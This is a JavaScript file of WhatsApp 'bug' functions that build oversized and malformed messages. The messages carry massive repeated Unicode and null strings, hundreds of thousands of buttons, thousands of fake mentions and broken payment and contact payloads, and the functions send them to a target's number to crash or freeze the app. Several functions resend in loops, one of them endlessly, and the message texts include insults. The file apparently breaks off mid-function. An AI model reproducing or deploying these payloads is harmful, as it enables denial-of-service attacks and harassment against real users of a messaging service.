async function Freeze(sock, target, useDelayMode = false) {
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const options = { participant: { jid: target } };

  if (useDelayMode) {
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
      await sock.relayMessage(target, payload, options);
    }
  } else {
    await sock.relayMessage(target, payload, options);
  }
}

async function GabungCrasHidOne(sock, target) {
const MakLo = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
fileLength: 9999,
height: 9999,
width: 9999,
mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
mediaKeyTimestamp: "1776937541",
jpegThumbnail: null,
caption: "MakLoo¡!",
scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
scanLengths: [
9999999999999999999,
9999999999999999999,
9999999999999999999,
9999999999999999999
],
midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
},
},
body: {
text: "MakLo¡!"
},
nativeFlowMessage: {
buttons: Array.from({ length: 499999 }, () => ({}))
}
}
}
}
};

let msg = generateWAMessageFromContent(target, MakLo, {});
await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
await new Promise(resolve => setTimeout(resolve, 1000));

const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
msg = generateWAMessageFromContent(target, MakLo, {});
await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
await new Promise(resolve => setTimeout(resolve, 1000));
}
}

async function GabungFungsi(sock, target) {
  const payload1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Mampus"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const payload2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const options = { participant: { jid: target } };

  await sock.relayMessage(target, payload1, options);
  await sock.relayMessage(target, payload2, options);
}

async function xtvxtv(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Hallo bang",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({
              wa_flow_response_params: {
                title: "ꦾ".repeat(60000)
              }
            }),
            version: 3
          },
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "Pilih Menu",
                sections: [
                  {
                    title: "Menu 1",
                    rows: [
                      { id: "id1", title: "Option 1" },
                      { id: "id2", title: "Option 2" }
                    ]
                  }
                ]
              })
            },
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "𑜦𑜠".repeat(10000),
                url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
              })
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function zmadouk(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: "🩸RAFI IS HERE",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "ꦽ".repeat(150000),
                  flow_message_version: "3"
                })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "\u0000".repeat(6000) + "𑲱".repeat(15000),
                  id: "\u0000".repeat(500)
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ𑲱".repeat(5000) + "ោ࣯࣯៝".repeat(1500),
                  url: "\u0000".repeat(6000)
                })
              }
            ]
          }
        }
      }
    }
  };

  const msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "hi maniez"
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              creatorName: "Bot"
            }
          },
          nativeFlowResponseMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "ꦽ".repeat(150000),
                  flow_message_version: "3"
                })
              },
              {
                name: "review_and_pay",
                buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2800000,\"offset\":100},\"reference_id\":\"4V7UYUA36DW\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-5ea03cbf-67c3-4a51-851b-21c435ddb78a\",\"name\":\"teds\",\"amount\":{\"value\":2800000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"teds\",\"native_payment_methods\":[],\"share_payment_status\":false,\"is_soft_deleted\":false}"
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  await sock.relayMessage(target, msg2, {
    participant: { jid: target }
  });
}

async function FreezeChatByMia(sock, target) {
    const message = {
        interactiveResponseMessage: {
            body: {
                text: "Rafi Is here",
                format: 1
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                    wa_flow_response_params: {
                        title: "𑇂𑆵𑆴𑆿".repeat(60000)
                    }
                }),
                version: 3,
            }
        }
    };

    try {
        await sock.relayMessage(target, message, { participant: { jid: target } });
        console.log("Pesan berhasil dikirim ke:", target);
    } catch (error) {
        console.error("Gagal mengirim pesan:", error);
    }
}

async function freeze(sock, target) {
  let kntl = [];
  kntl.push({
    name: "single_select",
    buttonParamsJson: JSON.stringify({})
  });
  
  for (let i = 0; i < 20000; i++) {
    kntl.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({ status: true })
    });
  }
  
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "assalamualaikum ini Rafi"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: kntl
          }
        }
      }
    }
  };
  
  await sock.relayMessage(target, message, {
    messageId: null, participant: { jid: target }
  });
}

async function BlankUi(sock, target) {
    const msgContent = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰"
                    },
                    footer: {
                        text: "\u0000"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "view_order",
                                buttonParamsJson: JSON.stringify({
                                    callback_data: "Exec_2"
                                })
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "ꦽ".repeat(60000),
                                    sections: [
                                        {
                                            title: "\u0000",
                                            highlight_label: "¡?",
                                            rows: [
                                                {
                                                    header: "\u0000",
                                                    title: "\u0000",
                                                    description: "\u0000",
                                                    id: "Exec_1"
                                                }
                                            ]
                                        }
                                    ]
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    flow_cta: "ꦽ".repeat(80000),
                                    header: "ꦽ".repeat(80000),
                                    body: "ꦽ".repeat(80000),
                                    flow_action_payload: { screen: "FORM_SCREEN" },
                                    flow_id: "1169834181134583",
                                    flow_message_version: "3",
                                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                })
                            }
                        ],
                        version: 1
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, msgContent, {
        messageId: sock.generateMessageTag(),
        participant: { jid: target }
    });
}

async function sendAllMessages(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "MakLo"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function VnXNewfrezeeHard(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 IS HERE BOY",
        format: 1
      },
      footer: {
        text: ""
      },
      nativeFlowMessage: {
        buttons: [
          {
           name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰"
            }),
           },
           {
           name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Frezee" + "ꦾ".repeat(60000),
              url: "https://t.me/fuckyanxz" + "ꦽ".repeat(250000),
              }),
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function sendButtonMessage(sock, target) {
  const VnXOneButton = [
    {
      buttonId: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰",
      buttonText: {
        displayText: "ꦽ".repeat(80000)
      },
      type: 1
    }
  ];

  const vnxbtns = {
    buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: VnXOneButton,
      headerType: 1
    }
  };

  await sock.relayMessage(target, vnxbtns, { participant: { jid: target } });
  
  console.log("Button message sent to:", target);
}

async function XTVcuy(sock, target) {
    const msgContent = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰"
                    },
                    footer: {
                        text: "\u0000"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "view_order",
                                buttonParamsJson: JSON.stringify({
                                    callback_data: "Exec_2"
                                })
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "ꦽ".repeat(60000),
                                    sections: [
                                        {
                                            title: "\u0000",
                                            highlight_label: "¡?",
                                            rows: [
                                                {
                                                    header: "\u0000",
                                                    title: "\u0000",
                                                    description: "\u0000",
                                                    id: "Exec_1"
                                                }
                                            ]
                                        }
                                    ]
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    flow_cta: "ꦽ".repeat(80000),
                                    header: "ꦽ".repeat(80000),
                                    body: "ꦽ".repeat(80000),
                                    flow_action_payload: { screen: "FORM_SCREEN" },
                                    flow_id: "1169834181134583",
                                    flow_message_version: "3",
                                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                })
                            }
                        ],
                        version: 1
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, msgContent, {
        messageId: sock.generateMessageTag(),
        participant: { jid: target }
    });
}

async function tolol(sock, target) {
    await sock.relayMessage(target, {
        interactiveResponseMessage: {
            body: {
                text: "Ghost Is Here" + "\u0000".repeat(300000),
                format: 1
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{"wa_flow_response_params":{"title":"${"𑇂𑆵𑆴𑆿".repeat(60000) + "\u0000".repeat(500000)}"}}`,
                version: 3
            }
        }
    }, {
        participant: {
            jid: target
        },
        timestamp: Date.now(),
        messageId: `Ghost Over Flow-${Date.now()}-${Math.random().toString(36).slice(2)}`,
        raw: true,
        priority: "high"
    });
}

async function Fuckyou(sock, target) {
  const loser = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰"
          },
          footer: {
            text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  url: "https://Wa.me/status#,,Fc",
                  merchant_url: "https://Wa.me/status#,,Fc"
                })
              }
            ]
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, loser, {
      messageId: null,
      participant: { jid: target }
    });
  } catch (e) {
  }
}

async function dileycok(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await new Promise(resolve => setTimeout(resolve, 500));

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(500000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function VnXNewDelayHardStcInvis(sock, target) {
  const VnXStc = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=0   1_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true',
          fileSha256: 'SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=',
          fileEncSha256: 'l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=',
          mediaKey: 'UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=',
          mimetype: 'image/webp',
          directPath:
            '/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c',
          fileLength: '10610',
          mediaKeyTimestamp: '1775044724',
          stickerSentTs: '1775044724091',
          contextInfo: {
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            isForwarded: true,
            forwardingScore: 250208,
            businessMessageForwardInfo: {
              businessOwnerJid: '13135550002@s.whatsapp.net',
            },
            participant: '13135550002@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: '𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 Is Here',
                  format: 'DEFAULT',
                },
                nativeFlowResponseMessage: {
                  buttons: [
                    {
                      name: 'galaxy_message',
                      buttonParamsJson: 'u0000'.repeat(250000),
                    },
                  ],
                },
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, VnXStc, {
    participant: { jid: target },
  });
}

async function VnXDelayHardContact(sock, target) {
  while (true) {
    const vnxcntct = {
      groupStatusMessageV2: {
        message: {
          contactMessage: {
            displayName: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 Is Here Cuy" + "\n".repeat(250000),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"\n".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\u0000".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\x10".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\n".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\u0000".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰.\x10.\u0000.\n.\0".repeat(4000)}\nEND:VCARD`,
            contextInfo: {
              participant: target,
              mentionedJid: [
                '0@s.whatsapp.net',
                ...(() => {
                  const listJid = [];
                  for (let i = 0; i < 2000; i++) {
                    let num = Math.floor(Math.random() * 900000);
                    listJid.push(`1${num}@s.whatsapp.net`);
                  }
                  return listJid;
                })()
              ],
            }
          },
        },
      },
    };

    try {
      await sock.relayMessage(target, vnxcntct, {
        participant: { jid: target },
      });
    } catch (e) {
      console.log('❌ Error di dalam loop:', e);
    }
  }
}

async function VnXNewDelayHard(sock, target) {
  const vnxmbgdly = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: 'X-T-V',
              format: 'DEFAULT',
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(990000)}}}`,
              version: 3,
             },
           },
         },
       },
     },
   };

  await sock.relayMessage(target, vnxmbgdly, {
    participant: { jid: target },
  });
}

async function CrashMakLo(target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Ghost Is Here"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_confirmation",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
}

async function CrashBapakLo(target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "YanXz Is Here"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_status",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
}

async function CrashNenekLo(target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Shin Is Here"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_cancel",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
}

async function FcMakLo(target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Mak Lu Gua Ewe Sini Cil"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
  
  await sleep(300);
  
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Bapak Lu Miskin Kontol"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
  
  await sleep(300);
  
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Nenek Lu Bau Tanah"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
  
  await sleep(300);
  
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Kakek Lu Bau Tanah"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
  
  await sleep(300);
  
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Ampas Kontol"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "send_payment",
            ParamsJson: "\u0003".repeat(90000),
          },
        ],
      },
    },
  }, { participant: { jid: target }});
}

async function VnXFrezeeChatNew(sock, target) {
  await sock.relayMessage(target, {
     interactiveResponseMessage: {
        body: {
          text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰",
          format: 1
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)}}}`,
          version: 3,
        }
     }
  }, { participant: { jid: target } });
}


async function sendAllMessages(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "MakLo"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function BlankFreezeChat(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function blank(sock, target) {
    let msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "#RapModeBug", // Gausah Diganti Lamer
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: -0,
                        },
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),                         
                            },
                        ],
                        messageParamsJson: "[{".repeat(10000),
                    },
                    contextInfo: {
                        participant: target,
                        mentionJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, msg2, {
        messageId: null,
        participant: { jid: target },
    });
  }

async function delayHardCuy(sock, target) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰",
          format: "DEFAULT",
        },
